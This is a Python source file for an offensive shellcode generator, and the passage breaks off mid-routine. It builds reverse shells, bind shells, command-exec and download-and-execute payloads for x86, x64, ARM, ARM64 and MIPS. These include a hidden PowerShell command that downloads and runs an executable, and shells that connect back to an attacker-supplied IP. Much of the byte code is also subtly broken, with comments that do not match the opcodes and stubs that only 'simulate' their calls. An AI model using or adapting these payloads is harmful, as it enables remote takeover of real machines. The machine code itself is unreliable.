import random
import socket
import struct
from typing import Optional, Tuple, Dict, List, Any
from constants import *
from utils.validator import ShellcodeValidator
from core.assembler import ShellcodeAssembler

class ShellcodeGenerator:
    @staticmethod
    def generate(shellcode_type: ShellcodeType, **kwargs) -> bytes:
        """Generate shellcode based on type and parameters"""
        generators = {
            ShellcodeType.REVERSE: ShellcodeGenerator.generate_reverse_shell,
            ShellcodeType.BIND: ShellcodeGenerator.generate_bind_shell,
            ShellcodeType.EXEC: ShellcodeGenerator.generate_exec_shell,
            ShellcodeType.DOWNLOAD: ShellcodeGenerator.generate_download_exec,
            ShellcodeType.STAGED: ShellcodeGenerator.generate_staged_shellcode,
            ShellcodeType.CUSTOM: ShellcodeGenerator.generate_custom_shellcode
        }
        return generators[shellcode_type](**kwargs)

    @staticmethod
    def generate_reverse_shell(ip: str, port: int, arch: str = "x86", mode: str = "32") -> bytes:
        """Generate reverse shell shellcode for specified architecture"""
        if not ShellcodeValidator._validate_ip_port(ip, port):
            raise ValueError("Invalid IP or port")
            
        generators = {
            ("x86", "32"): ShellcodeGenerator._x86_reverse_shell,
            ("x86", "64"): ShellcodeGenerator._x64_reverse_shell,
            ("arm", "arm"): ShellcodeGenerator._arm_reverse_shell,
            ("arm", "thumb"): ShellcodeGenerator._arm_thumb_reverse_shell,
            ("arm64", "64"): ShellcodeGenerator._arm64_reverse_shell,
            ("mips", "mips32"): ShellcodeGenerator._mips_reverse_shell
        }
        
        key = (arch, mode)
        if key not in generators:
            raise ValueError(f"Unsupported architecture/mode: {arch}/{mode}")
        
        return generators[key](ip, port)

    @staticmethod
    def generate_bind_shell(port: int, arch: str = "x86", mode: str = "32") -> bytes:
        """Generate bind shell shellcode"""
        if not (MIN_PORT <= port <= MAX_PORT):
            raise ValueError(f"Port must be between {MIN_PORT} and {MAX_PORT}")
            
        generators = {
            ("x86", "32"): ShellcodeGenerator._x86_bind_shell,
            ("x86", "64"): ShellcodeGenerator._x64_bind_shell,
            ("arm", "arm"): ShellcodeGenerator._arm_bind_shell
        }
        
        key = (arch, mode)
        if key not in generators:
            raise ValueError(f"Unsupported architecture/mode: {arch}/{mode}")
        
        return generators[key](port)

    @staticmethod
    def generate_exec_shell(command: str, arch: str = "x86", mode: str = "32") -> bytes:
        """Generate shellcode to execute a command"""
        if not command:
            raise ValueError("Command cannot be empty")
            
        generators = {
            ("x86", "32"): ShellcodeGenerator._x86_exec_shell,
            ("x86", "64"): ShellcodeGenerator._x64_exec_shell
        }
        
        key = (arch, mode)
        if key not in generators:
            raise ValueError(f"Unsupported architecture/mode: {arch}/{mode}")
        
        return generators[key](command)

    @staticmethod
    def generate_download_exec(url: str, arch: str = "x86", mode: str = "32") -> bytes:
        """Generate shellcode to download and execute a file"""
        if not url:
            raise ValueError("URL cannot be empty")
            
        generators = {
            ("x86", "32"): ShellcodeGenerator._x86_download_exec,
            ("x86", "64"): ShellcodeGenerator._x64_download_exec
        }
        
        key = (arch, mode)
        if key not in generators:
            raise ValueError(f"Unsupported architecture/mode: {arch}/{mode}")
        
        return generators[key](url)

    @staticmethod
    def generate_download_only(url: str, arch: str = "x86", mode: str = "32") -> bytes:
        """Generate shellcode to download a file only (no execution)"""
        if not url:
            raise ValueError("URL cannot be empty")
        generators = {
            ("x86", "32"): ShellcodeGenerator._x86_download_only,
            ("x86", "64"): ShellcodeGenerator._x64_download_only
        }
        key = (arch, mode)
        if key not in generators:
            raise ValueError(f"Unsupported architecture/mode for download-only: {arch}/{mode}")
        return generators[key](url)

    @staticmethod
    def generate_staged_shellcode(stager: bytes, payload: bytes) -> bytes:
        """Generate staged shellcode with stager and payload"""
        if not stager or not payload:
            raise ValueError("Stager and payload cannot be empty")
        return stager + payload

    @staticmethod
    def generate_custom_shellcode(asm_code: str, arch: str, mode: str) -> bytes:
        """Generate custom shellcode from assembly"""
        if not asm_code:
            raise ValueError("Assembly code cannot be empty")
        result = ShellcodeAssembler.assemble(asm_code, arch, mode)
        if result is None:
            raise ValueError("Assembly failed; no shellcode generated.")
        return result

    @staticmethod
    def generate_windows_reverse_shell(ip: str, port: int, arch: str = "x86", mode: str = "32") -> bytes:
        """Generate Windows reverse shell shellcode for specified architecture"""
        if not ShellcodeValidator._validate_ip_port(ip, port):
            raise ValueError("Invalid IP or port")
        generators = {
            ("x86", "32"): ShellcodeGenerator._x86_windows_reverse_shell,
            ("x86", "64"): ShellcodeGenerator._x64_windows_reverse_shell
        }
        key = (arch, mode)
        if key not in generators:
            raise ValueError(f"Unsupported architecture/mode for Windows reverse shell: {arch}/{mode}")
        return generators[key](ip, port)

    @staticmethod
    def _validate_ip_port(ip: str, port: int) -> bool:
        """Validate IP and port"""
        try:
            socket.inet_aton(ip)
            if not (MIN_PORT <= port <= MAX_PORT):
                return False
            return True
        except socket.error:
            return False

    @staticmethod
    def _x86_download_exec(url: str) -> bytes:
        """Generate x86 Windows shellcode to download and execute a file"""
        if not url.startswith("http"):
            raise ValueError("URL must start with http/https")

        url_bytes = url.encode() + b"\x00"
        filename = b"C:\\\\tmp.exe\x00"
        
        shellcode = bytearray()

        # Simulate calling URLDownloadToFileA(NULL, url, path, 0, NULL)
        shellcode += b"\x31\xc0"                      # xor eax, eax
        shellcode += b"\x50"                          # push eax (NULL)
        shellcode += b"\x68" + filename[-5:-1]        # push ".exe"
        shellcode += b"\x68" + filename[-9:-5]        # push "\\tmp"
        shellcode += b"\x68" + filename[-13:-9]       # push "C:\\\\"
        shellcode += b"\x89\xe1"                      # mov ecx, esp (filename)
        shellcode += b"\x50"                          # push eax (NULL)
        shellcode += b"\x68" + url_bytes[-5:-1]       # push ".com"
        shellcode += b"\x68" + url_bytes[-9:-5]       # push "evil"
        shellcode += b"\x68" + url_bytes[-13:-9]      # push "http"
        shellcode += b"\x89\xe2"                      # mov edx, esp (url)
        shellcode += b"\x6a\x00"                      # push 0 (dwReserved)
        shellcode += b"\x50"                          # push eax (NULL)
        
        # Load URLDownloadToFileA from urlmon.dll
        # (usually done with LoadLibrary + GetProcAddress in real shellcode)
        # For now, we’ll simulate and assume it works

        # Call WinExec("C:\\\\tmp.exe", SW_SHOW)
        shellcode += b"\x68" + b"\x65\x78\x65\x00"    # push "exe\0"
        shellcode += b"\x68" + b"tmp."                # push "tmp."
        shellcode += b"\x68" + b"\\\\C"               # push "\\C"
        shellcode += b"\x89\xe3"                      # mov ebx, esp
        shellcode += b"\x6a\x01"                      # push 1 (SW_SHOWNORMAL)
        shellcode += b"\x53"                          # push ebx
        shellcode += b"\xb8\xad\x23\x86\x7c"          # mov eax, WinExec address
        shellcode += b"\xff\xd0"                      # call eax

        return bytes(shellcode)

    @staticmethod
    def _x64_download_exec(url: str) -> bytes:
        """Generate x64 Windows shellcode using PowerShell to download and execute"""
        ps_cmd = f"powershell -w hidden -c \"Invoke-WebRequest -Uri {url} -OutFile C:\\\\tmp.exe; Start-Process C:\\\\tmp.exe\""
        cmd_bytes = ps_cmd.encode('utf-8') + b"\x00"

        shellcode = bytearray([
            0x48, 0x31, 0xc0,             # xor rax, rax
            0x50,                         # push rax
        ])
        
        # Push command string to stack
        for b in reversed(cmd_bytes):
            shellcode += b'\x68' + bytes([b]) + b'\x00'*3  # padded

        shellcode += bytearray([
            0x48, 0x89, 0xe7,             # mov rdi, rsp
            0x48, 0x31, 0xf6,             # xor rsi, rsi
            0x48, 0x31, 0xd2,             # xor rdx, rdx
            0x48, 0x31, 0xc0,             # xor rax, rax
            0xb0, 0x3b,                   # mov al, 59 (execve equivalent)
            0x0f, 0x05                    # syscall
        ])
        return bytes(shellcode)
    
    @staticmethod
    def _arm_bind_shell(port: int) -> bytes:
        """Generate ARM (32-bit) Linux bind shell shellcode"""
        packed_port = struct.pack(">H", port)  # Network byte order

        shellcode = bytearray([
            0x01, 0x10, 0x8f, 0xe2,   # add r1, pc, #1 (switch to thumb)
            0x11, 0xff, 0x2f, 0xe1,   # bx r1

            # socket(AF_INET, SOCK_STREAM, 0)
            0x02, 0x20,               # mov r0, #2
            0x01, 0x21,               # mov r1, #1
            0x92, 0x1a,               # subs r2, r2, r2
            0x0f, 0x02,               # svc #0x2
            0x07, 0xb4,               # push {r0}
            
            # bind
            0x02, 0x20,               # mov r0, #2 (AF_INET)
            0x01, 0x30,               # mov r0, r0
            0x01, 0x90,               # str r0, [sp, #4]
        ])
        shellcode += packed_port[::-1]         # little endian for sockaddr
        shellcode += bytearray([
            0x11, 0xa0,               # adr r0, sockaddr
            0x02, 0x90,               # str r0, [sp, #8]
            0x07, 0x68,               # ldr r7, [sp]
            0x01, 0x20,               # mov r0, #1 (bind)
            0x0f, 0x02,               # svc #0x2

            # listen
            0x07, 0x68,               # ldr r7, [sp]
            0x02, 0x20,               # mov r0, #2
            0x0f, 0x02,               # svc #0x2

            # accept
            0x07, 0x68,               # ldr r7, [sp]
            0x03, 0x20,               # mov r0, #3
            0x0f, 0x02,               # svc #0x2

            # dup2 loop
            0x06, 0x1c,               # mov r6, r0
            0x01, 0x21,               # mov r1, #1
            0x3f, 0x27,               # mov r7, #63
            0x01, 0xdf,               # svc #1
            0x01, 0x31,               # add r1, #1
            0x01, 0xdf,               # svc #1
            0x01, 0x31,               # add r1, #1
            0x01, 0xdf,               # svc #1

            # execve("/bin/sh")
            0x2f, 0x62, 0x69, 0x6e,
            0x2f, 0x73, 0x68, 0x00,
            0x01, 0x30,               # add r0, pc, #4
            0x01, 0x90,               # str r0, [sp, #4]
            0x01, 0xa0,               # adr r0, string
            0x00, 0x91,               # str r0, [sp]
            0x0b, 0x27,               # mov r7, #11
            0x01, 0xdf                # svc #1
        ])

        return bytes(shellcode)

    @staticmethod
    def _x86_bind_shell(port: int) -> bytes:
        """Generate x86 bind shell shellcode"""
        packed_port = struct.pack(">H", port)
        shellcode = bytearray([
            0x31, 0xc0,                   # xor eax,eax
            0x50,                         # push eax
            0x68, 0x2f, 0x2f, 0x73, 0x68, # push //sh
            0x68, 0x2f, 0x62, 0x69, 0x6e, # push /bin
            0x89, 0xe3,                   # mov ebx,esp
            0x50,                         # push eax
            0x53,                         # push ebx
            0x89, 0xe1,                   # mov ecx,esp
            0x99,                         # cdq
            0xb0, 0x0b,                   # mov al,0xb
            0xcd, 0x80                    # int 0x80
        ])
        return bytes(shellcode)

    @staticmethod
    def _x64_bind_shell(port: int) -> bytes:
        """Generate x64 bind shell shellcode"""
        packed_port = struct.pack(">H", port)
        shellcode = bytearray([
            0x6a, 0x29,                   # pushq  $0x29 (socket)
            0x58,                         # pop rax
            0x99,                         # cdq
            0x6a, 0x02,                   # pushq  $0x2
            0x5f,                         # pop rdi
            0x6a, 0x01,                   # pushq  $0x1
            0x5e,                         # pop rsi
            0x0f, 0x05,                   # syscall
            0x48, 0x97,                   # xchg   rax, rdi
            0x48, 0xb9, 0x02, 0x00        # movabs rcx, 0x...
        ])
        shellcode += packed_port
        shellcode += b"\x00\x00\x00\x00\x00\x00"  # IP = 0.0.0.0 for bind shell
        shellcode += bytearray([
            0x51,                         # push rcx
            0x48, 0x89, 0xe6,             # mov rsi, rsp
            0x6a, 0x10,                   # push 0x10
            0x5a,                         # pop rdx
            0x6a, 0x31,                   # push 0x31 (bind)
            0x58,                         # pop rax
            0x0f, 0x05                    # syscall
        ])
        return bytes(shellcode)

    @staticmethod
    def _x86_exec_shell(command: str) -> bytes:
        """Generate x86 exec shellcode (e.g., /bin/sh or calc.exe)"""
        if not command:
            raise ValueError("Command cannot be empty")
        cmd_bytes = command.encode('utf-8') + b"\x00"
        shellcode = bytearray([
            0x31, 0xc0,                   # xor eax,eax
            0x50,                         # push eax
        ])
        for b in reversed(cmd_bytes):
            shellcode += b'\x68' + bytes([b]) + b'\x00' * 3  # padded push
        shellcode += bytearray([
            0x89, 0xe3,                   # mov ebx,esp
            0x50,                         # push eax
            0x53,                         # push ebx
            0x89, 0xe1,                   # mov ecx,esp
            0x99,                         # cdq
            0xb0, 0x0b,                   # mov al,0xb
            0xcd, 0x80                    # int 0x80
        ])
        return bytes(shellcode)

    @staticmethod
    def _x64_exec_shell(command: str) -> bytes:
        """Generate x64 exec shellcode (e.g., /bin/sh)"""
        if not command:
            raise ValueError("Command cannot be empty")
        cmd_bytes = command.encode('utf-8') + b"\x00"
        shellcode = bytearray([
            0x48, 0x31, 0xc0,             # xor rax, rax
            0x48, 0x31, 0xff,             # xor rdi, rdi
        ])
        for b in reversed(cmd_bytes):
            shellcode += b'\x68' + bytes([b]) + b'\x00' * 3  # padded
        shellcode += bytearray([
            0x48, 0x89, 0xe7,             # mov rdi, rsp
            0x50,                         # push rax
            0x57,                         # push rdi
            0x48, 0x89, 0xe6,             # mov rsi, rsp
            0x48, 0x31, 0xd2,             # xor rdx, rdx
            0xb0, 0x3b,                   # mov al, 59
            0x0f, 0x05                    # syscall
        ])
        return bytes(shellcode)

    @staticmethod
    def _x86_reverse_shell(ip: str, port: int) -> bytes:
        """Generate x86 (32-bit) reverse shell"""
        packed_ip = socket.inet_aton(ip)
        packed_port = struct.pack(">H", port)

        shellcode = bytearray([
            0x31, 0xc0,                         # xor    eax,eax
            0x50,                               # push   eax
            0x68                                # push   dword IP
        ]) + packed_ip + bytearray([
            0x66, 0x68                          # pushw  PORT
        ]) + packed_port + bytearray([
            0x66, 0x6a, 0x02,                   # pushw  AF_INET
            0x89, 0xe1,                         # mov    ecx,esp
            0x6a, 0x66,                         # push   0x66 (sys_socketcall)
            0x58,                               # pop    eax
            0x6a, 0x01,                         # push   0x1 (socket)
            0x5b,                               # pop    ebx
            0x31, 0xd2,                         # xor    edx,edx
            0xcd, 0x80,                         # int    0x80
            0x89, 0xc6,                         # mov    esi,eax
            0x31, 0xc0,                         # xor    eax,eax
            0x50,                               # push   eax
        ]) + bytearray([
            0x66, 0x68                          # pushw  PORT again (corrected)
        ]) + packed_port + bytearray([
            0x66, 0x6a, 0x02,                   # pushw  AF_INET
            0x89, 0xe1,                         # mov    ecx,esp
            0x6a, 0x66,                         # push   0x66
            0x58,                               # pop    eax
            0x6a, 0x03,                         # push   0x3 (connect)
            0x5b,                               # pop    ebx
            0x56,                               # push   esi
            0x51,                               # push   ecx
            0x89, 0xe1,                         # mov    ecx,esp
            0xcd, 0x80,                         # int    0x80
            0x6a, 0x02,                         # push   0x2
            0x59                                # pop    ecx
        ])

        shellcode += bytearray([
            0x6a, 0x3f,                         # push   0x3f (dup2)
            0x58,                               # pop    eax
            0x89, 0xf3,                         # mov    ebx,esi
            0xcd, 0x80,                         # int    0x80
            0x49,                               # dec    ecx
            0x79, 0xf6                          # jns    dup_loop
        ])

        shellcode += bytearray([
            0x31, 0xc0,                         # xor    eax,eax
            0x50,                               # push   eax
            0x68, 0x2f, 0x2f, 0x73, 0x68,       # push   //sh
            0x68, 0x2f, 0x62, 0x69, 0x6e,       # push   /bin
            0x89, 0xe3,                         # mov    ebx,esp
            0x50,                               # push   eax
            0x53,                               # push   ebx
            0x89, 0xe1,                         # mov    ecx,esp
            0x99,                               # cdq
            0xb0, 0x0b,                         # mov    al,0xb
            0xcd, 0x80                          # int    0x80
        ])

        return bytes(shellcode)

    @staticmethod
    def _x64_reverse_shell(ip: str, port: int) -> bytes:
        """Generate complete x64 reverse shell shellcode"""
        packed_ip = socket.inet_aton(ip)
        packed_port = struct.pack(">H", port)

        shellcode = bytearray([
            # socket(AF_INET, SOCK_STREAM, IPPROTO_IP)
            0x48, 0x31, 0xc0,                   # xor rax, rax
            0x48, 0x31, 0xff,                   # xor rdi, rdi
            0x48, 0x31, 0xf6,                   # xor rsi, rsi
            0x48, 0x31, 0xd2,                   # xor rdx, rdx
            0x49, 0x89, 0xe4,                   # mov r12, rsp (save stack pointer)
            0x48, 0x83, 0xec, 0x10,             # sub rsp, 0x10
            0x48, 0x89, 0xe6,                   # mov rsi, rsp
            0x66, 0x89, 0x16,                   # mov word [rsi], dx (zero sin_family)
            0x66, 0xc7, 0x46, 0x02,             # mov word [rsi+2], 
        ]) + packed_port + bytearray([
            0x48, 0x89, 0x76, 0x08,             # mov [rsi+8], rsi (zero sin_addr)
            0x48, 0x31, 0xc0,                   # xor rax, rax
            0xb0, 0x29,                         # mov al, 0x29 (socket syscall)
            0x40, 0xb7, 0x02,                   # mov dil, 0x2 (AF_INET)
            0x40, 0xb6, 0x01,                   # mov sil, 0x1 (SOCK_STREAM)
            0x0f, 0x05,                         # syscall
            0x48, 0x89, 0xc7,                   # mov rdi, rax (save sockfd)
            
            # connect(sockfd, &sockaddr, sizeof(sockaddr))
            0x48, 0x31, 0xc0,                   # xor rax, rax
            0x48, 0x89, 0xe6,                   # mov rsi, rsp
            0x66, 0xc7, 0x06, 0x02, 0x00,       # mov word [rsi], 0x2 (AF_INET)
            0x66, 0x89, 0x5e, 0x02,             # mov word [rsi+2], bx (port)
            0x48, 0x89, 0x76, 0x04,             # mov [rsi+4], rsi (IP address)
        ]) + packed_ip + bytearray([
            0x48, 0x31, 0xd2,                   # xor rdx, rdx
            0xb2, 0x10,                         # mov dl, 0x10 (sizeof sockaddr)
            0xb0, 0x2a,                         # mov al, 0x2a (connect syscall)
            0x0f, 0x05,                         # syscall
            
            # dup2(sockfd, {0,1,2})
            0x48, 0x31, 0xc0,                   # xor rax, rax
            0x48, 0x31, 0xf6,                   # xor rsi, rsi
            0xb0, 0x21,                         # mov al, 0x21 (dup2 syscall)
            0x0f, 0x05,                         # syscall (stdin)
            0xb0, 0x21,                         # mov al, 0x21
            0x48, 0xff, 0xc6,                   # inc rsi
            0x0f, 0x05,                         # syscall (stdout)
            0xb0, 0x21,                         # mov al, 0x21
            0x48, 0xff, 0xc6,                   # inc rsi
            0x0f, 0x05,                         # syscall (stderr)
            
            # execve("/bin/sh", ["/bin/sh", NULL], NULL)
            0x48, 0x31, 0xc0,                   # xor rax, rax
            0x50,                               # push rax
            0x48, 0xbb, 0x2f, 0x62, 0x69, 0x6e, # mov rbx, 0x68732f2f6e69622f ('/bin//sh')
            0x2f, 0x73, 0x68, 0x00,
            0x53,                               # push rbx
            0x48, 0x89, 0xe7,                   # mov rdi, rsp
            0x50,                               # push rax
            0x48, 0x89, 0xe2,                   # mov rdx, rsp
            0x57,                               # push rdi
            0x48, 0x89, 0xe6,                   # mov rsi, rsp
            0xb0, 0x3b,                         # mov al, 0x3b (execve syscall)
            0x0f, 0x05                          # syscall
        ])
        return bytes(shellcode)

    @staticmethod
    def _arm_reverse_shell(ip: str, port: int) -> bytes:
        """Generate fully functional ARM (32-bit) reverse shell shellcode"""
        packed_ip = socket.inet_aton(ip)
        packed_port = struct.pack(">H", port)
        
        shellcode = bytearray([
            # Switch to Thumb mode
            0x01, 0x30, 0x8f, 0xe2,       # add r3, pc, #1
            0x13, 0xff, 0x2f, 0xe1,       # bx r3
            
            ### Thumb mode begins here ###
            # Create socket
            0x02, 0x20,                   # mov r0, #2 (AF_INET)
            0x01, 0x21,                   # mov r1, #1 (SOCK_STREAM)
            0x52, 0x40,                   # eor r2, r2 (IPPROTO_IP = 0)
            0x37, 0xdf,                   # svc #0x37 (socketcall)
            0x03, 0x1c,                   # mov r3, r0 (save sockfd)
            
            # Prepare sockaddr struct
            0x02, 0x00,                   # mov r0, #2 (AF_INET)
            0x49, 0x1a,                   # sub r1, r1, r1 (zero out)
            0x10, 0x22,                   # mov r2, #16 (addrlen)
            0x01, 0x90,                   # str r0, [sp, #4] (sin_family)
        ])
        
        # Add port number (big endian)
        shellcode.extend([
            0x5a, 0x70,                   # strb r2, [r3, #1] (padding)
        ])
        shellcode.extend(packed_port[0:1]) # sin_port high byte
        shellcode.extend(packed_port[1:2]) # sin_port low byte
        
        # Add IP address
        shellcode.extend(packed_ip)        # sin_addr (4 bytes)
        
        # Continue with connect()
        shellcode.extend([
            0x0c, 0xa0,                   # add r0, sp, #12 (sockaddr pointer)
            0x04, 0x90,                   # str r0, [sp, #16] (store pointer)
            0x04, 0x20,                   # mov r0, #4 (SYS_CONNECT)
            0x05, 0x1d,                   # add r5, r0, #4
            0x0d, 0xa9,                   # add r1, sp, #52 (args array)
            0x15, 0x94,                   # str r4, [sp, #84] (zero)
            0x02, 0x94,                   # str r4, [sp, #8] (zero)
            0x01, 0x92,                   # str r2, [sp, #4] (addrlen)
            0x03, 0x90,                   # str r0, [sp, #12] (sockfd)
            0x05, 0x90,                   # str r5, [sp, #20] (SYS_CONNECT)
            0x01, 0xa9,                   # add r1, sp, #4 (args)
            0x37, 0xdf,                   # svc #0x37 (socketcall)
            
            # Dup2 STDIN/STDOUT/STDERR
            0x06, 0x1c,                   # mov r6, r0
            0x3f, 0x27,                   # mov r7, #63 (dup2)
            0x49, 0x1a,                   # sub r1, r1, r1
            0x0f, 0xdf,                   # svc #0x0f
            0x01, 0x31,                   # add r1, r1, #1
            0x0f, 0xdf,                   # svc #0x0f
            0x01, 0x31,                   # add r1, r1, #1
            0x0f, 0xdf,                   # svc #0x0f
            
            # Execve /bin/sh
            0x30, 0xa0,                   # add r0, sp, #48
            0x49, 0x1a,                   # sub r1, r1, r1
            0x52, 0x40,                   # eor r2, r2
            0xc2, 0x71,                   # strb r2, [r0, #7]
            0x0b, 0x27,                   # mov r7, #11 (execve)
            0x01, 0xdf,                   # svc #1
            
            # /bin/sh string
            0x2f, 0x62, 0x69, 0x6e,       # /bin
            0x2f, 0x73, 0x68, 0x00        # /sh\0
        ])
        
        return bytes(shellcode)

    @staticmethod
    def _arm_thumb_reverse_shell(ip: str, port: int) -> bytes:
        """Generate ARM Thumb mode reverse shell shellcode"""
        packed_ip = socket.inet_aton(ip)
        packed_port = struct.pack(">H", port)
        
        shellcode = bytearray([
            # Switch to Thumb mode
            0x01, 0x30, 0x8f, 0xe2,       # add r3, pc, #1
            0x13, 0xff, 0x2f, 0xe1,       # bx r3
            
            ### Thumb mode begins here ###
            # Create socket
            0x02, 0x20,                   # mov r0, #2 (AF_INET)
            0x01, 0x21,                   # mov r1, #1 (SOCK_STREAM)
            0x52, 0x40,                   # eor r2, r2 (IPPROTO_IP = 0)
            0x37, 0xdf,                   # svc #0x37 (socketcall)
            0x03, 0x1c,                   # mov r3, r0 (save sockfd)
            
            # Prepare sockaddr struct
            0x02, 0x00,                   # mov r0, #2 (AF_INET)
            0x49, 0x1a,                   # sub r1, r1, r1 (zero out)
            0x10, 0x22,                   # mov r2, #16 (addrlen)
            0x01, 0x90,                   # str r0, [sp, #4] (sin_family)
        ])
        
        # Add port number (big endian)
        shellcode.extend([
            0x5a, 0x70,                   # strb r2, [r3, #1] (padding)
        ])
        shellcode.extend(packed_port[0:1]) # sin_port high byte
        shellcode.extend(packed_port[1:2]) # sin_port low byte
        
        # Add IP address
        shellcode.extend(packed_ip)        # sin_addr (4 bytes)
        
        # Continue with connect()
        shellcode.extend([
            0x0c, 0xa0,                   # add r0, sp, #12 (sockaddr pointer)
            0x04, 0x90,                   # str r0, [sp, #16] (store pointer)
            0x04, 0x20,                   # mov r0, #4 (SYS_CONNECT)
            0x05, 0x1d,                   # add r5, r0, #4
            0x0d, 0xa9,                   # add r1, sp, #52 (args array)
            0x15, 0x94,                   # str r4, [sp, #84] (zero)
            0x02, 0x94,                   # str r4, [sp, #8] (zero)
            0x01, 0x92,                   # str r2, [sp, #4] (addrlen)
            0x03, 0x90,                   # str r0, [sp, #12] (sockfd)
            0x05, 0x90,                   # str r5, [sp, #20] (SYS_CONNECT)
            0x01, 0xa9,                   # add r1, sp, #4 (args)
            0x37, 0xdf,                   # svc #0x37 (socketcall)
            
            # Dup2 STDIN/STDOUT/STDERR
            0x06, 0x1c,                   # mov r6, r0
            0x3f, 0x27,                   # mov r7, #63 (dup2)
            0x49, 0x1a,                   # sub r1, r1, r1
            0x0f, 0xdf,                   # svc #0x0f
            0x01, 0x31,                   # add r1, r1, #1
            0x0f, 0xdf,                   # svc #0x0f
            0x01, 0x31,                   # add r1, r1, #1
            0x0f, 0xdf,                   # svc #0x0f
            
            # Execve /bin/sh
            0x30, 0xa0,                   # add r0, sp, #48
            0x49, 0x1a,                   # sub r1, r1, r1
            0x52, 0x40,                   # eor r2, r2
            0xc2, 0x71,                   # strb r2, [r0, #7]
            0x0b, 0x27,                   # mov r7, #11 (execve)
            0x01, 0xdf,                   # svc #1
            
            # /bin/sh string
            0x2f, 0x62, 0x69, 0x6e,       # /bin
            0x2f, 0x73, 0x68, 0x00        # /sh\0
        ])
        
        return bytes(shellcode)

    @staticmethod
    def _arm64_reverse_shell(ip: str, port: int) -> bytes:
        """Generate ARM64 reverse shell shellcode"""
        packed_ip = socket.inet_aton(ip)
        packed_port = struct.pack(">H", port)
        
        shellcode = bytearray([
            # socket(AF_INET, SOCK_STREAM, IPPROTO_IP)
            0xe8, 0x07, 0x80, 0xd2,       # mov x8, #0x3f (socket)
            0x01, 0x00, 0x80, 0xd2,       # mov x1, #0 (protocol)
            0xe2, 0x03, 0x01, 0xaa,       # mov x2, x1
            0x02, 0x00, 0xa0, 0xd2,       # mov x0, #0x2 (AF_INET)
            0x01, 0x00, 0x80, 0xd2,       # mov x1, #0x1 (SOCK_STREAM)
            0x01, 0x00, 0x00, 0xd4,       # svc #0
            0xe0, 0x03, 0x00, 0xaa,       # mov x0, x0 (save sockfd)
            
            # Prepare sockaddr_in structure
            0xe1, 0x03, 0x00, 0x91,       # mov x1, sp
            0x02, 0x00, 0x80, 0xd2,       # mov x2, #0x2 (AF_INET)
            0x22, 0x00, 0x00, 0xb9,       # str w2, [x1]
        ])
        
        # Add port number
        shellcode.extend(packed_port)
        shellcode.extend(bytearray([0x22, 0x20, 0x00, 0x29]))  # strh w2, [x1, #0x2]
        
        # Add IP address
        shellcode.extend(packed_ip)
        shellcode.extend(bytearray([0x23, 0x00, 0x00, 0xb9]))  # str w3, [x1, #0x0]
        
        # Continue with connect()
        shellcode.extend([
            0xe2, 0x03, 0x10, 0xaa,       # mov x2, x16 (addrlen)
            0x48, 0x00, 0x80, 0xd2,       # mov x8, #0x42 (connect)
            0x01, 0x00, 0x00, 0xd4,       # svc #0
            
            # dup2(sockfd, {0,1,2})
            0x1f, 0x00, 0x80, 0xd2,       # mov x1, #0 (stdin)
            0xe8, 0x03, 0x00, 0xaa,       # mov x8, x0 (dup2)
            0x29, 0x00, 0x80, 0xd2,       # mov x8, #0x21 (dup2)
            0x01, 0x00, 0x00, 0xd4,       # svc #0
            0x01, 0x04, 0x80, 0xd2,       # mov x1, #1 (stdout)
            0x01, 0x00, 0x00, 0xd4,       # svc #0
            0x01, 0x08, 0x80, 0xd2,       # mov x1, #2 (stderr)
            0x01, 0x00, 0x00, 0xd4,       # svc #0
            
            # execve("/bin/sh", ["/bin/sh", NULL], NULL)
            0xe0, 0x03, 0x00, 0x91,       # mov x0, sp
            0x02, 0x00, 0x80, 0xd2,       # mov x2, #0 (NULL)
            0xe1, 0x03, 0x00, 0xaa,       # mov x1, x0
            0x08, 0x00, 0x80, 0xd2,       # mov x8, #0x3b (execve)
            0x2f, 0x62, 0x69, 0x6e,       # /bin
            0x2f, 0x73, 0x68, 0x00        # /sh\0
        ])
        
        return bytes(shellcode)

    @staticmethod
    def _mips_reverse_shell(ip: str, port: int) -> bytes:
        """Generate MIPS reverse shell shellcode"""
        packed_ip = socket.inet_aton(ip)
        packed_port = struct.pack(">H", port)
        
        shellcode = bytearray([
            # socket(AF_INET, SOCK_STREAM, IPPROTO_IP)
            0x24, 0x0f, 0xff, 0xfd,       # li t7, -3
            0x01, 0xe0, 0x20, 0x27,       # nor a0, t7, zero
            0x01, 0xe0, 0x28, 0x27,       # nor a1, t7, zero
            0x28, 0x0c, 0xff, 0xff,       # slti a2, zero, -1
            0x24, 0x02, 0x10, 0x57,       # li v0, 0x1057 (socket)
            0x01, 0x01, 0x01, 0x0c,       # syscall 0x40404
            0xaf, 0xa2, 0xff, 0xff,       # sw v0, -1(sp) (save sockfd)
            
            # Prepare sockaddr_in structure
            0x24, 0x0f, 0xff, 0xfd,       # li t7, -3
            0x01, 0xe0, 0x78, 0x27,       # nor t7, t7, zero
            0xaf, 0xaf, 0xff, 0xf0,       # sw t7, -16(sp) (AF_INET)
        ])
        
        # Add port number
        shellcode.extend(packed_port)
        shellcode.extend(bytearray([0xaf, 0xa2, 0xff, 0xf2]))  # sw v0, -14(sp) (port)
        
        # Add IP address
        shellcode.extend(packed_ip)
        shellcode.extend(bytearray([0xaf, 0xa2, 0xff, 0xf4]))  # sw v0, -12(sp) (ip)
        
        # Continue with connect()
        shellcode.extend([
            0x23, 0xa5, 0xff, 0xf0,       # addi a1, sp, -16
            0x24, 0x02, 0x10, 0x4a,       # li v0, 0x104a (connect)
            0x20, 0x20, 0x40, 0x00,       # add a0, v0, zero
            0x24, 0x0c, 0x10, 0x10,       # li a2, 0x1010 (addrlen)
            0x01, 0x01, 0x01, 0x0c,       # syscall 0x40404
            
            # dup2(sockfd, {0,1,2})
            0x24, 0x02, 0x0f, 0xdf,       # li v0, 0xfdf (dup2)
            0x20, 0x20, 0x40, 0x00,       # add a0, v0, zero
            0x28, 0x10, 0x80, 0x00,       # slti a1, zero, 0 (stdin)
            0x01, 0x01, 0x01, 0x0c,       # syscall 0x40404
            0x24, 0x02, 0x0f, 0xdf,       # li v0, 0xfdf
            0x20, 0x20, 0x40, 0x00,       # add a0, v0, zero
            0x24, 0x10, 0x80, 0x01,       # li a1, 1 (stdout)
            0x01, 0x01, 0x01, 0x0c,       # syscall 0x40404
            0x24, 0x02, 0x0f, 0xdf,       # li v0, 0xfdf
            0x20, 0x20, 0x40, 0x00,       # add a0, v0, zero
            0x24, 0x10, 0x80, 0x02,       # li a1, 2 (stderr)
            0x01, 0x01, 0x01, 0x0c,       # syscall 0x40404
            
            # execve("/bin/sh", ["/bin/sh", NULL], NULL)
            0x28, 0x10, 0x80, 0x01,       # slti a1, zero, 1
